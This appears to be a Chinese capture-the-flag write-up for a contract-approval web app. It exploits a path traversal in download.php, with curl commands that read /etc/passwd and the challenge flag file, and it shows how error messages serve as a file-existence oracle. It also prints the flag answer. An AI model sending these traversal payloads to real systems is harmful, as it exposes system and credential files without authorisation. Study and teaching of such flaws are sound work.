## 题目原文

> 公司内部合同审批系统上线测试中，用于管理各部门提交的合同文档审批流程。系统区分员工和管理员角色，员工提交合同，管理员负责审批。运维同事提到为了方便集成测试，部分接口做了临时调整。作为安全测试人员，你能发现这些调整带来的风险吗？

## 题解

### 入口与指纹

`Apache/2.4.54 (Debian)` + `PHP/7.4.33`，未登录访问 `/` 直接 302 到 `/login.php`。

登录页底部直接印着测试账号：

```
测试账号: employee / employee123
```

用这组账号登录，302 到 `/dashboard.php`。

### 关键观察

**1. 工作台页面源码里有一条「临时调整」的注释。**

```html
// 页面提示：开发时为了方便API集成测试，管理员审批接口临时开放
// TODO: 上线前记得加回权限验证！
console.log('提示：开发环境 - API调试模式已开启');
```

这是题目给的第一个线索，指向「审批接口缺权限校验」。但按注释去猜 `/api/approve.php`、`/api/contracts.php` 等路径全部 404——**注释描述的是风险类型，不是具体端点**。`/api/` 目录本身返回 403（存在但禁止列表），说明确实有一个 API 目录，只是文件名要另找。

**2. 下载链接把合同编号当文件名，且直接拼进路径。**

```html
<a href="/download.php?id=CONTRACT-2024-001.pdf">下载</a>
```

`download.php` 的注释写着「文件存储在 `/var/www/html/contracts/` 目录下」，代码是 `$file_id` 直接参与路径拼接、没有 `basename()` 或白名单。带 `.pdf` 的下载链接只是显示层，服务端没有校验扩展名。

### 利用链

**Step 1：确认穿越。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -b cj "http://$T/download.php?id=../../../../etc/passwd" | head -3
# root:x:0:0:root:/root:/bin/bash
```

四个 `../` 刚好从 `/var/www/html/contracts/` 回到 `/`。同一请求用 URL 编码形式 `..%2f..%2f..%2f..%2fetc%2fpasswd` 也成功。

注意两种写法的差别：

| 输入 | 结果 |
| --- | --- |
| `../../../../etc/passwd` | 200，返回文件 |
| `/etc/passwd` | 404，24 字节（绝对路径被拒） |
| `..%2f..%2f..%2f..%2fetc%2fpasswd` | 200，返回文件 |

**Step 2：确认 404 与「文件不存在」是两种不同信号。**

```
../../../../flag.txt             → 「错误：文件不存在」
../../../../challenge/flag.txt   → flag{...}
```

「文件不存在」是应用层提示，404 是 Web 服务器层拒绝。**同一条路径参数下出现两种错误形态，说明过滤发生在不同层**：服务器层挡绝对路径，应用层只是把 `file_exists` 的结果回显。这意味着可以直接用「文件是否存在」当目录探测的 oracle。

**Step 3：读 flag。**

```bash
curl -s -b cj "http://$T/download.php?id=../../../../challenge/flag.txt"
# flag{5a7f643a-904b-4e29-b1c5-bca97cdfc19a}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/challenge/flag.txt`，经 `download.php?id=` 路径穿越读取 |

### 复盘

- **题目注释是风险类型，不是端点清单**。`/api/approve.php` 之类全 404 时不要继续猜名字，先看页面上还有哪些**真的能用**的参数——本例的 `download.php?id=` 就在同一页。
- **两种错误形态 = 两层过滤**。服务器层 404 和应用层「文件不存在」同时出现，说明应用层没有做路径规范化，只是 `file_exists`。
- **`basename()` 缺失是路径穿越的根因**。看到「用参数拼文件路径 + 没有白名单」，先测四个 `../`，成本一次请求。
- 本题只要 100 分，捷径就在登录后的第一个下载链接上；不必为了「角色越权」这条提示去构造审批请求。
